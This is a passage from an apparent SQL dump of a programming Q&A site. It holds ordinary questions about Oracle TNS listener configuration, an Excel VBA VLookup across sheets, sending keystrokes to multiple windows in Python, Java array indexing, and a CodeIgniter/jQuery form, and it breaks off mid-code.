# The entries in tnsnames.ora are an alternative to using
# the names server with the onames adapter.
# They are a collection of aliases for the addresses that 
# the listener(s) is(are) listening for a database or 
# several databases.

# The following is the general syntax for any entry in 
# a tnsnames.ora file. There could be several such entries 
# tailored to the user&#x27;s needs.

&amp;lt;alias&amp;gt;= [ (DESCRIPTION_LIST =  # Optional depending on whether u have 
                # one or more descriptions
                # If there is just one description, unnecessary ]
      (DESCRIPTION=
        [ (SDU=2048) ]  # Optional, defaults to 2048
                # Can take values between 512 and 32K
        [ (ADDRESS_LIST=    # Optional depending on whether u have
                # one or more addresses
                # If there is just one address, unnecessary ]
          (ADDRESS=
        [ (COMMUNITY=&amp;lt;community_name&amp;gt;) ] 
        (PROTOCOL=tcp)
        (HOST=&amp;lt;hostname&amp;gt;)
        (PORT=&amp;lt;portnumber (1521 is a standard port used)&amp;gt;)
          )
          [ (ADDRESS=
          (PROTOCOL=ipc)
          (KEY=&amp;lt;ipckey (PNPKEY is a standard key used)&amp;gt;)    
        )
          ]
          [ (ADDRESS=
          [ (COMMUNITY=&amp;lt;community_name&amp;gt;) ]
          (PROTOCOL=decnet)
          (NODE=&amp;lt;nodename&amp;gt;)
          (OBJECT=&amp;lt;objectname&amp;gt;)
        )
          ]
              ... # More addresses
        [ ) ] # Optional depending on whether ADDRESS_LIST is used or not 
        [ (CONNECT_DATA=
        (SID=orcl)
        [ (GLOBAL_NAME=&amp;lt;global_database_name&amp;gt;) ]
          )
        ]
        [ (SOURCE_ROUTE=yes) ]  
      )
      (DESCRIPTION=     
        [ (SDU=2048) ]  # Optional, defaults to 2048
                # Can take values between 512 and 32K
        [ (ADDRESS_LIST= ]  # Optional depending on whether u have more
                # than one address or not
                # If there is just one address, unnecessary
          (ADDRESS
        [ (COMMUNITY=&amp;lt;community_name&amp;gt;) ]
        (PROTOCOL=tcp)
        (HOST=&amp;lt;hostname&amp;gt;)
        (PORT=&amp;lt;portnumber (1521 is a standard port used)&amp;gt;)
          )
          [ (ADDRESS=
          (PROTOCOL=ipc)
          (KEY=&amp;lt;ipckey (PNPKEY is a standard key used)&amp;gt;)
             )
          ]
          ...       # More addresses
        [ ) ]       # Optional depending on whether ADDRESS_LIST  
                # is being used
        [ (CONNECT_DATA=
        (SID=orcl)
        [ (GLOBAL_NAME=&amp;lt;global_database_name&amp;gt;) ]
          )
        ]
        [ (SOURCE_ROUTE=yes) ]
      )
      [ (CONNECT_DATA=
          (SID=orcl)
                [ (GLOBAL_NAME=&amp;lt;global_database_name&amp;gt;) ]
        )
      ]
      ...   # More descriptions 
    [ ) ]   # Optional depending on whether DESCRIPTION_LIST is used or not
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;AND&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr&gt;

&lt;pre&gt;&lt;code&gt;this is my tnsnames.ora

# copyright (c) 1997 by the Oracle Corporation
# 
# NAME
#   listener.ora
# FUNCTION
#   Network Listener startup parameter file example
# NOTES
#   This file contains all the parameters for listener.ora,
#   and could be used to configure the listener by uncommenting
#   and changing values.  Multiple listeners can be configured
#   in one listener.ora, so listener.ora parameters take the form
#   of SID_LIST_&amp;lt;lsnr&amp;gt;, where &amp;lt;lsnr&amp;gt; is the name of the listener
#   this parameter refers to.  All parameters and values are
#   case-insensitive.

# &amp;lt;lsnr&amp;gt;
#   This parameter specifies both the name of the listener, and
#   it listening address(es). Other parameters for this listener
#   us this name in place of &amp;lt;lsnr&amp;gt;.  When not specified,
#   the name for &amp;lt;lsnr&amp;gt; defaults to &quot;LISTENER&quot;, with the default
#   address value as shown below.
#
# LISTENER =
#  (ADDRESS_LIST=
#   (ADDRESS=(PROTOCOL=tcp)(HOST=localhost)(PORT=1521))
#   (ADDRESS=(PROTOCOL=ipc)(KEY=PNPKEY)))   

# SID_LIST_&amp;lt;lsnr&amp;gt;
#   List of services the listener knows about and can connect 
#   clients to.  There is no default.  See the Net8 Administrator&#x27;s
#   Guide for more information.
#
# SID_LIST_LISTENER=
#   (SID_LIST=
#   (SID_DESC=
#           #BEQUEATH CONFIG
#          (GLOBAL_DBNAME=salesdb.mycompany)
#          (SID_NAME=sid1)          
#          (ORACLE_HOME=/private/app/oracle/product/8.0.3)
#           #PRESPAWN CONFIG
#         (PRESPAWN_MAX=20)
#     (PRESPAWN_LIST=
#           (PRESPAWN_DESC=(PROTOCOL=tcp)(POOL_SIZE=2)(TIMEOUT=1))
#         )
#        )
#       )

# PASSWORDS_&amp;lt;lsnr&amp;gt;
#   Specifies a password to authenticate stopping the listener.
#   Both encrypted and plain-text values can be set.  Encrypted passwords
#   can be set and stored using lsnrctl.  
#     LSNRCTL&amp;gt; change_password
#       Will prompt for old and new passwords, and use encryption both
#       to match the old password and to set the new one.
#     LSNRCTL&amp;gt; set password
#   Will prompt for the new password, for authentication with 
#       the listener. The password must be set before running the next
#       command.
#     LSNRCTL&amp;gt; save_config
#       Will save the changed password to listener.ora. These last two
#       steps are not necessary if SAVE_CONFIG_ON_STOP_&amp;lt;lsnr&amp;gt; is ON.
#       See below.
#
# Default: NONE
#
# PASSWORDS_LISTENER = 20A22647832FB454      # &quot;foobar&quot;

# SAVE_CONFIG_ON_STOP_&amp;lt;lsnr&amp;gt;
#   Tells the listener to save configuration changes to listener.ora when
#   it shuts down.  Changed parameter values will be written to the file,
#   while preserving formatting and comments.
# Default: OFF
# Values: ON/OFF
#
# SAVE_CONFIG_ON_STOP_LISTENER = ON

# USE_PLUG_AND_PLAY_&amp;lt;lsnr&amp;gt;
#   Tells the listener to contact an Onames server and register itself
#   and its services with Onames.
# Values: ON/OFF
# Default: OFF
#
# USE_PLUG_AND_PLAY_LISTENER = ON

# LOG_FILE_&amp;lt;lsnr&amp;gt;
#   Sets the name of the listener&#x27;s log file.  The .log extension
#   is added automatically.
# Default=&amp;lt;lsnr&amp;gt;
#
# LOG_FILE_LISTENER = lsnr

# LOG_DIRECTORY_&amp;lt;lsnr&amp;gt;
#   Sets the directory for the listener&#x27;s log file.
# Default: &amp;lt;oracle_home&amp;gt;/network/log
#
# LOG_DIRECTORY_LISTENER = /private/app/oracle/product/8.0.3/network/log

# TRACE_LEVEL_&amp;lt;lsnr&amp;gt;
#   Specifies desired tracing level.
# Default: OFF
# Values: OFF/USER/ADMIN/SUPPORT/0-16
#
# TRACE_LEVEL_LISTENER = SUPPORT

# TRACE_FILE_&amp;lt;lsnr&amp;gt;
#   Sets the name of the listener&#x27;s trace file. The .trc extension
#   is added automatically.
# Default: &amp;lt;lsnr&amp;gt;
#
# TRACE_FILE_LISTENER = lsnr

# TRACE_DIRECTORY_&amp;lt;lsnr&amp;gt;
#   Sets the directory for the listener&#x27;s trace file.
# Default: &amp;lt;oracle_home&amp;gt;/network/trace
#
# TRACE_DIRECTORY_LISTENER=/private/app/oracle/product/8.0.3/network/trace
# CONNECT_TIMEOUT_&amp;lt;lsnr&amp;gt;
#   Sets the number of seconds that the listener waits to get a 
#   valid database query after it has been started.
# Default: 10
#
# CONNECT_TIMEOUT_LISTENER=10
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (6, 1, 'ORA-12505, TNS: listener does not currently know of SID given in connect descriptor Vendor code 12505');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (6, 6, 43, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (6, 2);
INSERT INTO questiontag (question_id, tag_id) VALUES (6, 4);
INSERT INTO tag (text) VALUES ('oracle11g');
INSERT INTO questiontag (question_id, tag_id) VALUES (6, 18);
INSERT INTO tag (text) VALUES ('oracle-sqldeveloper');
INSERT INTO questiontag (question_id, tag_id) VALUES (6, 19);
INSERT INTO tag (text) VALUES ('oracle12c');
INSERT INTO questiontag (question_id, tag_id) VALUES (6, 20);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (7, 32, '&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/o64a4.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;Source sheet (&quot;Sheet2&quot;)&lt;/a&gt;
&lt;a href=&quot;https://i.stack.imgur.com/KkCtW.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;Output sheet (&quot;Sheet3&quot;)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I have a list of names and associated values in &quot;Sheet2&quot;.  I have another list of names in &quot;Sheet3&quot;.  Where the name in sheet2 can also be found in Sheet3, i would like to add in the associated value in the column adjacent to the name in Sheet3.&lt;/p&gt;

&lt;p&gt;To do this, I&#x27;ve created a nested loop which behaves as follows;  &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Loops over all names (&quot;X&quot;) in &quot;sheet2&quot; &lt;/li&gt;
&lt;li&gt;For each of these names iterate over all names (&quot;Y&quot;) in &quot;sheet 3&quot;&lt;/li&gt;
&lt;li&gt;where the values match, perform a &lt;code&gt;VLookup&lt;/code&gt; on &quot;Sheet2&quot; and highlight the cell to flag that a value was added.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This code worked fine when the two tables were hosted in the same worksheet.  On attempting to replicate this behaviour across two different worksheets (by ensuring that explicit worksheet references were added to all ranges) it doesnt do anything.&lt;/p&gt;

&lt;p&gt;Any help would be much appreciated&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Sub colincrosssheet()

On Error Resume Next

Dim inputrange As Range
Dim outputrange As Range
Dim X As Range
Dim Y As Range
Dim inputtoprow As Integer
Dim inputbottomrow As Integer
Dim inputcolumn As Integer
Dim outputtoprow As Integer
Dim outputbottomrow As Integer
Dim outputcolumn As Integer
Dim rngFindin As Range
Dim rngFindout As Range
Dim vlookuprange As Range

&#x27;set input column, which contains the line item ids from Pacing Tool, and also sets bottom row
Set rngFindin = Worksheets(&quot;Sheet2&quot;).Cells.Find(&quot;nameinput&quot;, LookIn:=xlValues, lookat:=xlWhole)
If rngFindin Is Nothing Then
    MsgBox &quot;Could not find &#x27;Line Item Id&#x27; column in your SDF. Please review file.&quot;, vbOKOnly, &quot;Column not found&quot;
Else
    inputtoprow = Worksheets(&quot;Sheet2&quot;).rngFindin.Row + 1
    inputcolumn = Worksheets(&quot;Sheet2&quot;).rngFindin.Column
    inputbottomrow = Worksheets(&quot;Sheet2&quot;).Cells(Rows.Count, inputcolumn).End(xlUp).Row
End If

&#x27;set output column, which contains the line item ids in the SDF, and also sets bottom row
Set rngFindout = Worksheets(&quot;Sheet3&quot;).Cells.Find(&quot;nameoutput&quot;, LookIn:=xlValues, lookat:=xlWhole)
If rngFindout Is Nothing Then
    MsgBox &quot;Could not find &#x27;Line Item Id&#x27; column in your SDF. Please review file.&quot;, vbOKOnly, &quot;Column not found&quot;
Else
    outputtoprow = Worksheets(&quot;Sheet3&quot;).rngFindout.Row + 1
    outputcolumn = Worksheets(&quot;Sheet3&quot;).rngFindout.Column
    outputbottomrow = Worksheets(&quot;Sheet3&quot;).Cells(Rows.Count, outputcolumn).End(xlUp).Row
End If

&#x27;define Vlookup range&#x27;
Set vlookuprange = Worksheets(&quot;Sheet2&quot;).Range(Cells(inputtoprow, inputcolumn), Cells(inputbottomrow, inputcolumn + 1))

&#x27;defines input and output range which contain line item ids
Set inputrange = Worksheets(&quot;Sheet2&quot;).Range(Cells(inputtoprow, inputcolumn), Cells(inputbottomrow, inputcolumn))
Set outputrange = Worksheets(&quot;Sheet3&quot;).Range(Cells(outputtoprow, outputcolumn), Cells(outputbottomrow, outputcolumn))

&#x27;loop through input range and update relevant column in SDF with new bid values
For Each X In Worksheets(&quot;Sheet2&quot;).inputrange
    For Each Y In Worksheets(&quot;Sheet3&quot;).outputrange
        If Worksheets(&quot;Sheet3&quot;).Y.Value = Worksheets(&quot;Sheet2&quot;).X.Value Then
            Worksheets(&quot;Sheet3&quot;).Y.Offset(ColumnOffset:=1).Value = Application.WorksheetFunction.VLookup(Worksheets(&quot;Sheet2&quot;).X.Value, Worksheets(&quot;Sheet2&quot;).vlookuprange, 2, False)
            Worksheets(&quot;Sheet3&quot;).Y.Offset(ColumnOffset:=1).Interior.ColorIndex = 28
        End If
    Next Y
Next X

End Sub
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (7, 1, 'Vlookup across two worksheets using VBA');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (7, 7, 32, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (7, 8);
INSERT INTO questiontag (question_id, tag_id) VALUES (7, 14);
INSERT INTO questiontag (question_id, tag_id) VALUES (7, 15);
INSERT INTO tag (text) VALUES ('vlookup');
INSERT INTO questiontag (question_id, tag_id) VALUES (7, 21);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (8, 45, '&lt;p&gt;My issue currently is that of emulating keystroke input to an arbitrary program (such as a running game).&lt;/p&gt;

&lt;p&gt;Currently I am using win32 libraries on Windows to find windows (win32gui.FindWindow) and grab focus (via win32gui.SetForegroundWindow), then send keyboard input (win32api.keybd_event).&lt;/p&gt;

&lt;p&gt;This works if I am only sending input to a single program, but I wish to parallelize, playing multiple games simultaneously. This does not work with my current method as both applications demand &quot;focus&quot; for the keys to go to the right application, thus interfering with each other.&lt;/p&gt;

&lt;p&gt;Ideally I would like something that sends input to a given window, that does not require focus , and is independent of input given to other windows or the currently focused window.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (8, 1, 'Keyboard output to multiple programs simultaneously?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (8, 8, 45, 'Create');
INSERT INTO tag (text) VALUES ('python');
INSERT INTO questiontag (question_id, tag_id) VALUES (8, 22);
INSERT INTO tag (text) VALUES ('linux');
INSERT INTO questiontag (question_id, tag_id) VALUES (8, 23);
INSERT INTO tag (text) VALUES ('windows');
INSERT INTO questiontag (question_id, tag_id) VALUES (8, 24);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -4, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (9, 6, '&lt;p&gt;Lets say i got this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;int b[][];
b=new int[4][4];
for(int i=0; i&amp;lt;b.length; i++ )
            {
                for(int j=0;j&amp;lt;b[i].length;j++)
                {
                    b[i][j]=(Math.random()*10);
            }
            }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And i want to print out at which &lt;code&gt;[i][j]&lt;/code&gt; the value is &lt;code&gt;&amp;lt;5&lt;/code&gt;, how would i do this?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (9, 1, 'Java 2d Array print out index at certain element');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (9, 9, 6, 'Create');
INSERT INTO tag (text) VALUES ('java');
INSERT INTO questiontag (question_id, tag_id) VALUES (9, 25);
INSERT INTO tag (text) VALUES ('arrays');
INSERT INTO questiontag (question_id, tag_id) VALUES (9, 26);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (10, 17, '&lt;p&gt;I have a select form that will send the selected value to the controller, and a form modal that will send two values to the same controller, all of these two will be sending their data with jquery functions! 
here is my code : &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HTML:
&amp;lt;!DOCTYPE html&amp;gt;
    &amp;lt;html&amp;gt;
        &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
        &amp;lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&amp;gt;
        &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;


        &amp;lt;!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries --&amp;gt;
        &amp;lt;!-- WARNING: Respond.js doesn&#x27;t work if you view the page via file:// --&amp;gt;
        &amp;lt;!--[if lt IE 9]&amp;gt;
          &amp;lt;script src=&quot;https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
          &amp;lt;script src=&quot;https://oss.maxcdn.com/respond/1.4.2/respond.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
        &amp;lt;![endif]--&amp;gt;
      &amp;lt;/head&amp;gt;
      &amp;lt;body&amp;gt;



    &amp;lt;div class=&quot;form-group&quot;&amp;gt;
                         &amp;lt;h3&amp;gt;Veuillez choisir un cycle :&amp;lt;/h3&amp;gt;&amp;lt;br/&amp;gt;

                          &amp;lt;label&amp;gt;Cycle: &amp;lt;/label&amp;gt;

                          &amp;lt;form method=&quot;post&quot; accept-charset=&quot;utf-8&quot;&amp;gt;

                         &amp;lt;select name=&quot;cyc&quot; id =&quot;Select1&quot; class=&quot;input-small&quot;&amp;gt;

                            &amp;lt;?php foreach($cycle as $row) {?&amp;gt;

                                 &amp;lt;option value=&quot;&amp;lt;?php echo $row-&amp;gt;id; ?&amp;gt;&quot;&amp;gt;&amp;lt;?php echo $row-&amp;gt;libelle; ?&amp;gt;&amp;lt;/option&amp;gt;

                            &amp;lt;?php }?&amp;gt;
                        &amp;lt;/select&amp;gt;

                          &amp;lt;/form&amp;gt;

                          &amp;lt;button class=&quot;btn btn-success&quot; onclick=&quot;display()&quot;&amp;gt;&amp;lt;i class=&quot;glyphicon glyphicon-plus&quot;&amp;gt;&amp;lt;/i&amp;gt; display&amp;lt;/button&amp;gt;
                        &amp;lt;/div&amp;gt;





      &amp;lt;div id=&quot;x&quot; style=&quot;display:none;&quot; class=&quot;container&quot;&amp;gt;

    &amp;lt;/center&amp;gt;


        &amp;lt;button class=&quot;btn btn-success&quot; onclick=&quot;add_filiere()&quot;&amp;gt;&amp;lt;i class=&quot;glyphicon glyphicon-plus&quot;&amp;gt;&amp;lt;/i&amp;gt; Ajouter une filiere&amp;lt;/button&amp;gt;
        &amp;lt;br /&amp;gt;
        &amp;lt;br /&amp;gt;

        &amp;lt;table id=&quot;table_id&quot; class=&quot;table table-striped table-bordered&quot; cellspacing=&quot;0&quot; width=&quot;100%&quot;&amp;gt;
          &amp;lt;thead&amp;gt;
            &amp;lt;tr&amp;gt;
                     &amp;lt;th&amp;gt;Identifiant&amp;lt;/th&amp;gt;
              &amp;lt;th&amp;gt;Identifiant du cycle&amp;lt;/th&amp;gt;
              &amp;lt;th&amp;gt;Libellé&amp;lt;/th&amp;gt;

              &amp;lt;th&amp;gt;Action&amp;lt;/th&amp;gt;
            &amp;lt;/tr&amp;gt;
          &amp;lt;/thead&amp;gt;
          &amp;lt;tbody&amp;gt;
                    &amp;lt;?php foreach($filiere as $row){?&amp;gt;
                         &amp;lt;tr&amp;gt;
                             &amp;lt;td&amp;gt;&amp;lt;?php echo $row-&amp;gt;id;?&amp;gt;&amp;lt;/td&amp;gt;
                      &amp;lt;td&amp;gt;&amp;lt;?php echo $row-&amp;gt;id_cycle;?&amp;gt;&amp;lt;/td&amp;gt;
                             &amp;lt;td&amp;gt;&amp;lt;?php echo $row-&amp;gt;libelle;?&amp;gt;&amp;lt;/td&amp;gt;

                                    &amp;lt;td&amp;gt;
                                        &amp;lt;button class=&quot;btn btn-warning&quot; onclick=&quot;edit_filiere(&amp;lt;?php echo $row-&amp;gt;id;?&amp;gt;)&quot;&amp;gt;&amp;lt;i class=&quot;glyphicon glyphicon-pencil&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/button&amp;gt;
                                        &amp;lt;button class=&quot;btn btn-danger&quot; onclick=&quot;delete_filiere(&amp;lt;?php echo $row-&amp;gt;id;?&amp;gt;)&quot;&amp;gt;&amp;lt;i class=&quot;glyphicon glyphicon-remove&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/button&amp;gt;


                                    &amp;lt;/td&amp;gt;
                          &amp;lt;/tr&amp;gt;
                         &amp;lt;?php }?&amp;gt;



          &amp;lt;/tbody&amp;gt;


        &amp;lt;/table&amp;gt;

      &amp;lt;/div&amp;gt;



      &amp;lt;script src=&quot;&amp;lt;?php echo base_url(&#x27;assests/datatables/js/jquery.dataTables.min.js&#x27;)?&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;
      &amp;lt;script src=&quot;&amp;lt;?php echo base_url(&#x27;assests/datatables/js/dataTables.bootstrap.js&#x27;)?&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;


      &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
      $(document).ready( function () {
          $(&#x27;#table_id&#x27;).DataTable( {
            &quot;lengthMenu&quot;: [[5,10, 25, 50, -1], [5,10, 25, 50, &quot;All&quot;]]
        });
      } );
        var save_method; //for save method string
        var table;


        function add_filiere()
        {
          save_method = &#x27;add&#x27;;
          $(&#x27;#form&#x27;)[0].reset(); // reset form on modals
          $(&#x27;#modal_form&#x27;).modal(&#x27;show&#x27;); // show bootstrap modal
        //$(&#x27;.modal-title&#x27;).text(&#x27;Add Person&#x27;); // Set Title to Bootstrap modal title
        }

        function display()
        {
       /*  var ic = document.getElementById(&#x27;cyc&#x27;).value;
         document.getElementById(&#x27;x&#x27;).style.display = &#x27;block&#x27;;

         $.ajax({
           url : &quot;&amp;lt;?php echo site_url(&#x27;index.php/filiere/test&#x27;) ?&amp;gt;&quot;,
           type :&quot;POST&quot;,
            data :{ic: ic},
            success: function(data)
            {

            },
            error : function(jqXHR, textStatus, errorThrown)
            {
              alert(&#x27;cannot reach controller&#x27;);
            }


         });*/
        }

        function edit_filiere(id)
        {
          save_method = &#x27;update&#x27;;
          $(&#x27;#form&#x27;)[0].reset(); // reset form on modals

          //Ajax Load data from ajax
          $.ajax({
            url : &quot;&amp;lt;?php echo site_url(&#x27;index.php/filiere/filiere_edit/&#x27;)?&amp;gt;/&quot; + id,
            type: &quot;GET&quot;,
            dataType: &quot;JSON&quot;,
            success: function(data)
            {

                $(&#x27;[name=&quot;i&quot;]&#x27;).val(data.id);
                $(&#x27;[name=&quot;l&quot;]&#x27;).val(data.libelle);



                $(&#x27;#modal_form&#x27;).modal(&#x27;show&#x27;); // show bootstrap modal when complete loaded
                $(&#x27;.modal-title&#x27;).text(&#x27;Modifier département&#x27;); // Set title to Bootstrap modal title

            },
            error: function (jqXHR, textStatus, errorThrown)
            {
                alert(&#x27;Error get data from ajax&#x27;);
            }
        });
        }



        function save()
        {
          var url;
          if(save_method == &#x27;add&#x27;)
          {
              url = &quot;&amp;lt;?php echo base_url(&#x27;index.php/filiere/filiere_add&#x27;)?&amp;gt;&quot;;
          }
          else
          {
            url = &quot;&amp;lt;?php echo base_url(&#x27;index.php/filiere/filiere_update&#x27;)?&amp;gt;&quot;;
          }

           // ajax adding data to database
              $.ajax({
                url : url,
                type: &quot;POST&quot;,
                data: $(&#x27;#form&#x27;).serialize(),
                dataType: &quot;JSON&quot;,
                success: function(data)
                {
                   //if success close modal and reload ajax table
                   $(&#x27;#modal_form&#x27;).modal(&#x27;hide&#x27;);
                  location.reload();// for reload a page
                },
                error: function (jqXHR, textStatus, errorThrown)
                {
                    alert(&#x27;Error adding / update data&#x27;);
                }
            });
        }


        function delete_filiere(id)
        {
          if(confirm(&#x27;Voulez vous supprimer ce filiere ?&#x27;))
          {
            // ajax delete data from database
              $.ajax({
                url : &quot;&amp;lt;?php echo site_url(&#x27;index.php/filiere/filiere_delete&#x27;)?&amp;gt;/&quot;+id,
                type: &quot;POST&quot;,
                dataType: &quot;JSON&quot;,
                success: function(data)
                {

                   location.reload();
                },
                error: function (jqXHR, textStatus, errorThrown)
                {
                    alert(&#x27;Error deleting data&#x27;);
                }
            });

          }
        }

      &amp;lt;/script&amp;gt;

      &amp;lt;!-- Bootstrap modal --&amp;gt;
      &amp;lt;div class=&quot;modal fade&quot; id=&quot;modal_form&quot; role=&quot;dialog&quot;&amp;gt;
      &amp;lt;div class=&quot;modal-dialog&quot;&amp;gt;
        &amp;lt;div class=&quot;modal-content&quot;&amp;gt;
          &amp;lt;div class=&quot;modal-header&quot;&amp;gt;
            &amp;lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot; aria-label=&quot;Close&quot;&amp;gt;&amp;lt;span aria-hidden=&quot;true&quot;&amp;gt;&amp;amp;times;&amp;lt;/span&amp;gt;&amp;lt;/button&amp;gt;
            &amp;lt;h3 class=&quot;modal-title&quot;&amp;gt;Départements&amp;lt;/h3&amp;gt;
          &amp;lt;/div&amp;gt;
          &amp;lt;div class=&quot;modal-body form&quot;&amp;gt;
            &amp;lt;form action=&quot;#&quot; id=&quot;form&quot; class=&quot;form-horizontal&quot;&amp;gt;

              &amp;lt;div class=&quot;form-body&quot;&amp;gt;
                &amp;lt;div class=&quot;form-group&quot;&amp;gt;
                  &amp;lt;label class=&quot;control-label col-md-3&quot;&amp;gt;Identifiant&amp;lt;/label&amp;gt;
                  &amp;lt;div class=&quot;col-md-9&quot;&amp;gt;
                    &amp;lt;input name=&quot;i&quot; placeholder=&quot;Identifiant&quot; class=&quot;form-control&quot; type=&quot;text&quot;&amp;gt;
                  &amp;lt;/div&amp;gt;
                &amp;lt;/div&amp;gt;
                &amp;lt;div class=&quot;form-group&quot;&amp;gt;
                  &amp;lt;label class=&quot;control-label col-md-3&quot;&amp;gt;Libelle&amp;lt;/label&amp;gt;
                  &amp;lt;div class=&quot;col-md-9&quot;&amp;gt;
                    &amp;lt;input name=&quot;l&quot; placeholder=&quot;Nom&quot; class=&quot;form-control&quot; type=&quot;text&quot;&amp;gt;
                  &amp;lt;/div&amp;gt;
                &amp;lt;/div&amp;gt;




              &amp;lt;/div&amp;gt;
            &amp;lt;/form&amp;gt;
              &amp;lt;/div&amp;gt;
              &amp;lt;div class=&quot;modal-footer&quot;&amp;gt;
                &amp;lt;button type=&quot;button&quot; id=&quot;btnSave&quot; onclick=&quot;save()&quot; class=&quot;btn btn-primary&quot;&amp;gt;Save&amp;lt;/button&amp;gt;
                &amp;lt;button type=&quot;button&quot; class=&quot;btn btn-danger&quot; data-dismiss=&quot;modal&quot;&amp;gt;Cancel&amp;lt;/button&amp;gt;
              &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;&amp;lt;!-- /.modal-content --&amp;gt;
          &amp;lt;/div&amp;gt;&amp;lt;!-- /.modal-dialog --&amp;gt;
        &amp;lt;/div&amp;gt;&amp;lt;!-- /.modal --&amp;gt;
      &amp;lt;!-- End Bootstrap modal --&amp;gt;

      &amp;lt;/body&amp;gt;
    &amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My controller:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
            defined(&#x27;BASEPATH&#x27;) OR exit(&#x27;No direct script access allowed&#x27;);

            class Filiere extends CI_Controller {

                /**
                 * Index Page for this controller.
                 *
                 * Maps to the following URL
                 *      http://example.com/index.php/welcome
                 *  - or -
                 *      http://example.com/index.php/welcome/index
                 *  - or -
                 * Since this controller is set as the default controller in
                 * config/routes.php, it&#x27;s displayed at http://example.com/
                 *
                 * So any other public methods not prefixed with an underscore will
                 * map to /index.php/welcome/&amp;lt;method_name&amp;gt;
                 * @see https://codeigniter.com/user_guide/general/urls.html
                 */

                 public function __construct()
                    {
                        parent::__construct();
                        $this-&amp;gt;load-&amp;gt;helper(&#x27;url&#x27;);
                        $this-&amp;gt;load-&amp;gt;model(&#x27;filiere_model&#x27;);
                        $this-&amp;gt;load-&amp;gt;model(&#x27;cycle_model&#x27;);

                    }


                public function index()
                {
                    $this-&amp;gt;data[&quot;cycle&quot;] = $this-&amp;gt;cycle_model-&amp;gt;get_all_cycle();
                   $id_cycle = &quot;&quot;;
                    $this-&amp;gt;data[&#x27;filiere&#x27;] = $this-&amp;gt;filiere_model-&amp;gt;get_all_filiere($id_cycle);
                    $this-&amp;gt;data[&quot;title&quot;] = &quot;Gérer les filieres&quot;;
                    $this-&amp;gt;data[&quot;page&quot;] = $this-&amp;gt;load-&amp;gt;view(&#x27;filiere_view&#x27;,$this-&amp;gt;data,true);
                    $this-&amp;gt;load-&amp;gt;view(&quot;default&quot;,$this-&amp;gt;data);               
                }
            public function test()
             {
                  $id_cycle = $_POST[&#x27;ic&#x27;];
                  $this-&amp;gt;data[&#x27;x&#x27;]= $id_cycle;
                  $this-&amp;gt;data[&quot;page&quot;] = $this-&amp;gt;load-&amp;gt;view(&#x27;test_view&#x27;,$this-&amp;gt;data,true);
                  $this-&amp;gt;load-&amp;gt;view(&quot;default&quot;,$this-&amp;gt;data);
            }
                public function filiere_add()
                    {
                        $data = array(
                                &#x27;id&#x27; =&amp;gt; $this-&amp;gt;input-&amp;gt;post(&#x27;i&#x27;),
                                 &#x27;id_cycle&#x27; =&amp;gt; $this-&amp;gt;input-&amp;gt;post(&#x27;cyc&#x27;),
                                  &#x27;libelle&#x27; =&amp;gt; $this-&amp;gt;input-&amp;gt;post(&#x27;l&#x27;),

                            );
                        $insert = $this-&amp;gt;filiere_model-&amp;gt;filiere_add($data);
                        echo json_encode(array(&quot;status&quot; =&amp;gt; TRUE));
                    }
                    public function filiere_edit($id)
                    {
                        $data = $this-&amp;gt;filiere_model-&amp;gt;get_by_id($id);



                        echo json_encode($data);
                    }

                    public function filiere_update()
                {
                    $data = array(
                                &#x27;id&#x27; =&amp;gt; $this-&amp;gt;input-&amp;gt;post(&#x27;i&#x27;),
                                &#x27;libelle&#x27; =&amp;gt; $this-&amp;gt;input-&amp;gt;post(&#x27;l&#x27;)

                            );
                    $this-&amp;gt;filiere_model-&amp;gt;filiere_update(array(&#x27;id&#x27; =&amp;gt; $this-&amp;gt;input-&amp;gt;post(&#x27;i&#x27;)), $data);
